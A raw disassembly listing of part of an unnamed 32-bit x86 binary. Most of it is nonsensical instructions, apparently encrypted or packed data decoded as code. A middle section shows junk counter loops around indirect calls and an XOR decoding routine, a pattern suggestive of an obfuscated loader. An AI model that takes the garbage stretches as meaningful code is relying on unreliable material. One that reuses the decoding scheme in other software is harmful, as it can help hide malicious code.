  410c5d:	push   ss
  410c5e:	push   edx
  410c5f:	push   es
  410c60:	pop    ds
  410c61:	pop    ecx
  410c62:	mov    ebx,0x4802d438
  410c67:	stos   DWORD PTR es:[edi],eax
  410c68:	mov    dl,0xc7
  410c6a:	cmp    al,0x4b
  410c6c:	jae    0x410c87
  410c6e:	in     al,dx
  410c6f:	xor    esi,0x7d4bc84a
  410c75:	add    eax,0xad2ed667
  410c7a:	push   eax
  410c7b:	std    
  410c7c:	(bad)  
  410c7d:	cmp    BYTE PTR [esi-0x5bc17371],ch
  410c83:	repz repnz loope 0x410c73
  410c87:	jnp    0x410c76
  410c89:	inc    ecx
  410c8a:	ret    0x2c76
  410c8d:	fs xor al,0x80
  410c90:	cld    
  410c91:	sub    al,0x9b
  410c93:	xchg   ebx,eax
  410c94:	push   0xffffffd9
  410c96:	dec    DWORD PTR fs:[edx-0x366bfc0d]
  410c9d:	sub    dh,BYTE PTR [ecx]
  410c9f:	loop   0x410c6f
  410ca1:	stc    
  410ca2:	pop    DWORD PTR [ecx]
  410ca4:	aam    0x98
  410ca6:	push   0x71d926f8
  410cab:	jge    0x410d0a
  410cad:	mov    ah,0x43
  410caf:	jne    0x410d15
  410cb1:	dec    ebp
  410cb2:	inc    edx
  410cb3:	out    dx,al
  410cb4:	or     al,0xb
  410cb6:	lods   eax,DWORD PTR ds:[esi]
  410cb7:	cmc    
  410cb8:	sbb    edx,esi
  410cba:	lea    esp,[esp+edx*2+0x64cda165]
  410cc1:	gs sbb al,0x62
  410cc4:	imul   ebp,DWORD PTR [eax-0x58b7e13e],0x4b
  410ccb:	mov    ebx,0xbb7c6d3d
  410cd0:	xchg   DWORD PTR [ecx-0x1],ecx
  410cd3:	cdq    
  410cd4:	push   ss
  410cd5:	retf   0x5c60
  410cd8:	in     eax,0x88
  410cda:	cli    
  410cdb:	or     DWORD PTR [ebx],ebx
  410cdd:	div    edx
  410cdf:	fbstp  TBYTE PTR [edi+0x50]
  410ce2:	sbb    BYTE PTR [edx],ah
  410ce4:	inc    edi
  410ce5:	clc    
  410ce6:	cld    
  410ce7:	aas    
  410ce8:	dec    edx
  410ce9:	daa    
  410cea:	dec    edx
  410ceb:	bound  edx,QWORD PTR ds:0x67ba2c2f
  410cf1:	xchg   bx,ax
  410cf3:	bound  esp,QWORD PTR [ebx]
  410cf5:	call   0x57e54501
  410cfa:	or     DWORD PTR [eax+0x7c9f263f],edi
  410d00:	mov    edx,?
  410d02:	jmp    DWORD PTR [esi]
  410d04:	pop    ds
  410d05:	(bad)  
  410d06:	mov    dh,0xff
  410d08:	pop    ecx
  410d09:	lea    esi,[eax]
  410d0b:	mov    edx,edi
  410d0d:	inc    edx
  410d0e:	scas   eax,DWORD PTR es:[edi]
  410d0f:	add    edx,ecx
  410d11:	loopne 0x410d2a
  410d13:	mov    dh,0xa2
  410d15:	(bad)  
  410d16:	test   al,0xfe
  410d18:	test   al,0xc2
  410d1a:	add    DWORD PTR [esi],0x4e
  410d1d:	mov    bh,0x94
  410d1f:	mov    edx,0x45a1419b
  410d24:	xchg   DWORD PTR [edi+edi*8+0x13],esi
  410d28:	fldcw  WORD PTR [ebx+0x8]
  410d2b:	hlt    
  410d2c:	jge    0x410d22
  410d2e:	mov    al,ds:0x86423e94
  410d34:	jnp    0x410cf4
  410d36:	sbb    BYTE PTR [ecx-0x2a],al
  410d39:	shl    BYTE PTR [ebx+0x46],0x7e
  410d3d:	sar    DWORD PTR [eax],cl
  410d3f:	out    0xf6,al
  410d41:	jge    0x410d6a
  410d43:	outs   dx,DWORD PTR ds:[esi]
  410d44:	inc    edx
  410d45:	ins    DWORD PTR es:[edi],dx
  410d46:	sub    al,0x16
  410d48:	fdivr  QWORD PTR [edi-0x1d]
  410d4b:	sub    eax,0xeee29d1a
  410d50:	cwde   
  410d51:	jns    0x410cf3
  410d53:	pop    ecx
  410d54:	push   0xffffffd1
  410d56:	js     0x410d3e
  410d58:	js     0x410cf7
  410d5a:	pop    edi
  410d5b:	mov    ecx,0xb4a784fb
  410d60:	dec    edi
  410d61:	adc    BYTE PTR [ecx+0x50355923],ch
  410d67:	add    eax,0xa9b1c4f0
  410d6c:	and    ecx,DWORD PTR [edx-0x214086db]
  410d72:	inc    esp
  410d73:	xchg   esi,eax
  410d74:	xchg   ecx,eax
  410d75:	mov    ch,ah
  410d77:	jns    0x410d55
  410d79:	shr    BYTE PTR [esi],cl
  410d7b:	cli    
  410d7c:	push   edx
  410d7d:	sub    dl,BYTE PTR [edx]
  410d7f:	xchg   ecx,eax
  410d80:	sub    bl,dh
  410d82:	dec    ebx
  410d83:	mov    dh,0xe
  410d85:	ss cmc 
  410d87:	lea    eax,[eax+esi*2]
  410d8a:	pop    ecx
  410d8b:	push   esp
  410d8c:	ror    BYTE PTR [ecx],1
  410d8e:	mov    cl,dl
  410d90:	push   0xcf3e34a2
  410d95:	jnp    0x410d69
  410d97:	pop    ebx
  410d98:	adc    BYTE PTR [eax+0x15],dl
  410d9b:	fdivp  st(3),st
  410d9d:	stc    
  410d9e:	and    DWORD PTR [esi],ecx
  410da0:	pop    ebx
  410da1:	push   eax
  410da2:	pop    eax
  410da3:	imul   ecx,DWORD PTR [ebx+0x154753ff],0x5
  410daa:	inc    edx
  410dab:	(bad)  
  410dac:	pop    edx
  410dad:	push   edi
  410dae:	hlt    
  410daf:	lds    ebp,FWORD PTR [ebx+0x33e67f25]
  410db5:	stos   BYTE PTR es:[edi],al
  410db6:	pusha  
  410db7:	clc    
  410db8:	je     0x410d5b
  410dba:	jp     0x410d61
  410dbc:	push   0x2b
  410dbe:	mov    ch,0x5c
  410dc0:	rcr    BYTE PTR [edx+0xf],1
  410dc3:	sti    
  410dc4:	pusha  
  410dc5:	cs call 0xdbb:0xb3c3aa70
  410dcd:	mov    ah,0xf8
  410dcf:	test   al,0xef
  410dd1:	push   es
  410dd2:	xchg   edi,eax
  410dd3:	test   BYTE PTR [ecx-0x24],0xad
  410dd7:	std    
  410dd8:	shr    BYTE PTR [edx+0xc],1
  410ddb:	add    DWORD PTR [esi-0xac4f8fc],edi
  410de1:	mov    DWORD PTR [esi],ebx
  410de3:	sub    eax,0x991cdaad
  410de8:	hlt    
  410de9:	pop    ebx
  410dea:	dec    edi
  410deb:	adc    esi,DWORD PTR [edi]
  410ded:	fistp  QWORD PTR [edi-0x34]
  410df0:	push   ss
  410df1:	jmp    0xd658f6c6
  410df6:	daa    
  410df7:	pop    ebp
  410df8:	mov    ebp,0x4f64072e
  410dfd:	pushf  
  410dfe:	mov    ebp,0x804bfee8
  410e03:	repnz sti 
  410e05:	out    dx,eax
  410e06:	pop    es
  410e07:	mov    al,ds:0x18aeb983
  410e0c:	sub    BYTE PTR [ecx-0x6a],ah
  410e0f:	xor    ebp,DWORD PTR es:[ebx+0x31da0d6e]
  410e16:	loope  0x410e1c
  410e18:	lds    ebp,FWORD PTR [eax+0x2335d578]
  410e1e:	or     eax,0xe853bbee
  410e23:	mov    ecx,0x245a7b33
  410e28:	jbe    0x410e4a
  410e2a:	inc    ebp
  410e2b:	mov    al,0xe1
  410e2d:	adc    al,0xfc
  410e2f:	add    eax,0xd9dfd343
  410e34:	cdq    
  410e35:	gs out dx,eax
  410e37:	jg     0x410ddf
  410e39:	and    ebx,esi
  410e3b:	das    
  410e3c:	push   eax
  410e3d:	and    esp,ebx
  410e3f:	mov    ss,WORD PTR [ecx-0x72]
  410e42:	push   0x2193eff4
  410e47:	xchg   DWORD PTR [edx-0x25],edi
  410e4a:	inc    edx
  410e4b:	dec    esi
  410e4c:	rcl    BYTE PTR [esi-0x5a],0x7
  410e50:	enter  0xc116,0x75
  410e54:	in     al,dx
  410e55:	dec    esi
  410e56:	fbstp  TBYTE PTR [eax]
  410e58:	stc    
  410e59:	jno    0x410e68
  410e5b:	nop
  410e5c:	or     al,0x38
  410e5f:	je     0x410edf
  410e61:	xor    ebp,esi
  410e63:	(bad)  
  410e64:	retf   
  410e65:	vandnps ymm6,ymm2,YMMWORD PTR [ebx]
  410e69:	ins    DWORD PTR es:[edi],dx
  410e6a:	add    dl,dl
  410e6c:	retf   
  410e6d:	xchg   esi,eax
  410e6e:	mov    edi,0x38f71123
  410e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e74:	and    bh,BYTE PTR [ebx]
  410e76:	adc    DWORD PTR [ecx+0x4b],esp
  410e79:	adc    DWORD PTR [ecx+0x12c6ccf4],esp
  410e7f:	pop    ecx
  410e80:	pop    edx
  410e81:	imul   BYTE PTR [edx+0x35]
  410e84:	and    bl,BYTE PTR [ebx+esi*1+0x3]
  410e88:	(bad)  
  410e89:	adc    al,0x1b
  410e8b:	or     ch,BYTE PTR [eax-0x1c]
  410e8e:	ffree  st(0)
  410e90:	std    
  410e91:	pop    ebx
  410e92:	ins    BYTE PTR es:[edi],dx
  410e93:	nop
  410e94:	pop    ebp
  410e95:	daa    
  410e96:	push   0xffffffe8
  410e98:	int    0x6
  410e9a:	test   DWORD PTR [ebx+0x1b3dfe86],edx
  410ea0:	xchg   edi,eax
  410ea1:	mov    ebp,0x4d583929
  410ea6:	retf   
  410ea7:	popf   
  410ea8:	mov    ds:0x11b64dd6,eax
  410ead:	jbe    0x410edc
  410eaf:	ror    edx,cl
  410eb1:	pop    eax
  410eb2:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410eb4:	mov    edi,0xa19ff68f
  410eb9:	jns    0x410f30
  410ebb:	push   0xfffffffb
  410ebd:	jmp    0xf6e0:0x2dfc006b
  410ec4:	cmp    BYTE PTR [ebx+0x16],cl
  410ec7:	outs   dx,BYTE PTR ds:[esi]
  410ec8:	jmp    0x5d6ce98
  410ecd:	ins    BYTE PTR es:[edi],dx
  410ece:	outs   dx,BYTE PTR ds:[esi]
  410ecf:	invd   
  410ed1:	push   edx
  410ed2:	and    al,0x45
  410ed4:	pop    DWORD PTR [edi]
  410ed6:	xchg   edi,eax
  410ed7:	ds xchg ebx,eax
  410ed9:	inc    esi
  410eda:	or     eax,0xb08f2c8d
  410edf:	push   0xffffffdc
  410ee1:	push   0x2c
  410ee3:	mov    bh,0x73
  410ee5:	stc    
  410ee6:	mov    esp,0x1ba79671
  410eeb:	adc    BYTE PTR [ebx-0x52],ah
  410eee:	mov    bl,0xc9
  410ef0:	rcr    BYTE PTR [edi-0x30c133de],0xac
  410ef7:	stc    
  410ef8:	cmp    dh,bh
  410efa:	aam    0x57
  410efc:	add    ah,dh
  410efe:	lods   eax,DWORD PTR ds:[esi]
  410eff:	xchg   edi,eax
  410f00:	dec    ebp
  410f01:	push   cs
  410f02:	mov    eax,ds:0xf7046936
  410f07:	cmp    eax,0x8a022b64
  410f0c:	and    bh,BYTE PTR [edi-0x44]
  410f0f:	shl    DWORD PTR [esi],1
  410f11:	xchg   esi,eax
  410f12:	loope  0x410ed4
  410f14:	mov    ebx,0xc874faea
  410f19:	bound  ebp,QWORD PTR [ebp-0x4d]
  410f1c:	bound  edx,QWORD PTR [ecx-0x69]
  410f1f:	inc    eax
  410f20:	pop    ebp
  410f21:	pop    esp
  410f22:	les    esi,FWORD PTR [eax-0x7ee1da6f]
  410f28:	sbb    al,BYTE PTR [edi+0x37]
  410f2b:	cmp    eax,0x52525208
  410f30:	xchg   DWORD PTR [edi+0x5c],edi
  410f33:	lea    ebp,[ebx-0x14550525]
  410f39:	push   ebp
  410f3a:	test   al,0x74
  410f3c:	push   0x6
  410f3e:	mov    esi,DWORD PTR [eax]
  410f40:	dec    edx
  410f41:	mov    ax,ds:0xb60f33e9
  410f47:	xchg   ebx,eax
  410f48:	stos   DWORD PTR es:[edi],eax
  410f49:	adc    bl,BYTE PTR [ebx+eax*2]
  410f4c:	push   edi
  410f4d:	aas    
  410f4e:	repnz xor DWORD PTR [esi],edi
  410f51:	push   ds
  410f52:	sti    
  410f53:	fild   QWORD PTR [eax]
  410f55:	jge    0x410f53
  410f57:	lods   al,BYTE PTR ds:[esi]
  410f58:	cdq    
  410f59:	test   DWORD PTR [ebx-0x54daf9c4],esp
  410f5f:	xor    DWORD PTR [esi+0x8],esi
  410f62:	cwde   
  410f63:	shr    BYTE PTR [edi+edx*8],cl
  410f66:	sub    al,0x64
  410f68:	ins    DWORD PTR es:[edi],dx
  410f69:	or     BYTE PTR [ebx+eax*4],cl
  410f6c:	stos   DWORD PTR es:[edi],eax
  410f6d:	pop    ds
  410f6e:	push   eax
  410f6f:	dec    edx
  410f70:	xor    esi,DWORD PTR [edx]
  410f72:	out    dx,eax
  410f73:	xchg   esp,eax
  410f74:	pop    ecx
  410f75:	sbb    eax,0xf9c090b0
  410f7a:	mov    esp,0xf2e572f7
  410f7f:	xor    eax,0x2fbbc26e
  410f84:	mov    ch,0xc8
  410f86:	xor    BYTE PTR [esi+0x3861f181],bh
  410f8c:	sbb    eax,0x1e025f5e
  410f91:	out    0xa5,eax
  410f93:	ret    
  410f94:	jb     0x410f2f
  410f96:	mov    ah,BYTE PTR [edi]
  410f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f99:	push   edx
  410f9a:	mov    cl,0x4b
  410f9c:	jp     0x410fdb
  410f9e:	dec    esi
  410f9f:	cli    
  410fa0:	jae    0x411012
  410fa2:	xchg   BYTE PTR [ecx],cl
  410fa4:	cmp    ch,ch
  410fa6:	sub    al,cl
  410fa8:	jg     0x410f8c
  410faa:	cmp    DWORD PTR [ebp-0x35120707],edx
  410fb0:	stc    
  410fb1:	inc    edx
  410fb2:	push   ss
  410fb3:	test   dl,dh
  410fb5:	rcr    ebx,1
  410fb7:	mov    ds:0x2c0c46cd,al
  410fbc:	push   DWORD PTR [edi]
  410fbe:	xor    eax,0xa85bd097
  410fc3:	loop   0x41100c
  410fc5:	jae    0x410fff
  410fc7:	fucomip st,st(3)
  410fc9:	pop    edx
  410fca:	lods   al,BYTE PTR ds:[esi]
  410fcb:	cmp    DWORD PTR [edi-0x71],edx
  410fce:	mov    ebp,0x9bd33990
  410fd3:	enter  0xd84d,0x7f
  410fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fd8:	aam    0xfd
  410fda:	lds    esi,FWORD PTR [eax+0x246fa5ec]
  410fe0:	mov    dh,0xb3
  410fe2:	pop    ds
  410fe3:	jne    0x410fdd
  410fe5:	mov    ch,0x88
  410fe7:	push   0x5
  410fe9:	lods   al,BYTE PTR ds:[esi]
  410fea:	pop    edi
  410feb:	call   0x189f:0x3ad15113
  410ff2:	outs   dx,BYTE PTR ds:[esi]
  410ff3:	mov    DWORD PTR [eax-0x20caf34f],ecx
  410ff9:	cmp    al,0x4a
  410ffb:	and    al,0x34
  410ffd:	xchg   ebp,eax
  410ffe:	and    cl,BYTE PTR [ebp+0x18]
  411001:	(bad)  
  411002:	jns    0x41101a
  411004:	repnz and esi,DWORD PTR [esi-0x69]
  411008:	ins    BYTE PTR es:[edi],dx
  411009:	imul   ebx,DWORD PTR [esi+eiz*2+0x4df03fcb],0xffffffb9
  411011:	mov    esi,0xb08e931
  411016:	leave  
  411017:	sub    BYTE PTR [ecx+0x1d],0xd4
  41101b:	jmp    0xfc98:0x5c2de39a
  411022:	cmp    DWORD PTR [eax-0x75],ebx
  411025:	dec    ebp
  411026:	or     BYTE PTR [eax+0x8a8d],bh
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	shl    esi,1
  4115ad:	lds    ebx,FWORD PTR [eax+0x7c7caf40]
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	and    bl,BYTE PTR [ecx+0x5d5cde99]
  4115bd:	lock jne 0x411590
  4115c0:	dec    esp
  4115c1:	lds    ebx,FWORD PTR [eax-0x7d]
  4115c4:	mov    ds:0xb27f25e7,al
  4115c9:	sbb    al,0x7a
  4115cb:	jbe    0x41155c
  4115cd:	xor    edx,ebx
  4115cf:	xor    al,0xc5
  4115d1:	sub    esi,ecx
  4115d3:	mov    ds:0x7f39ab69,al
  4115d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115d9:	in     al,dx
  4115da:	loopne 0x411601
  4115dc:	out    0x45,al
  4115de:	pop    esp
  4115df:	mov    al,ds:0xa3d41ce9
  4115e4:	add    bl,al
  4115e6:	cmp    BYTE PTR [edx],bh
  4115e8:	out    dx,eax
  4115e9:	pop    ss
  4115ea:	das    
  4115eb:	in     eax,0x24
  4115ed:	adc    ebp,esi
  4115ef:	in     al,dx
  4115f0:	adc    ebx,DWORD PTR [esi-0x2a3d25b0]
  4115f6:	jmp    0x56df0bc
  4115fb:	icebp  
  4115fc:	jmp    0xd176:0x53463f59
  411603:	mov    ebp,0x94d15b61
  411608:	mov    eax,0xb3261f6e
  41160d:	sub    DWORD PTR [ecx],esi
  41160f:	jne    0x411640
  411611:	mov    ebp,0x72eb2d1c
  411616:	push   ds
  411617:	cs adc esi,ecx
  41161a:	aas    
  41161b:	in     eax,0x11
  41161d:	push   DWORD PTR [ebp+esi*8-0x6]
  411621:	ret    
  411622:	jmp    0xed91d068
  411627:	aam    0x2a
  411629:	test   eax,0xd83e46a7
  41162e:	and    BYTE PTR [edx-0x544e5c6b],bl
  411634:	mov    ch,0xe
  411636:	mov    ebx,0x2deb44ba
  41163b:	out    dx,al
  41163c:	mov    ah,0x54
  41163e:	push   esi
  41163f:	ins    BYTE PTR es:[edi],dx
  411640:	push   ecx
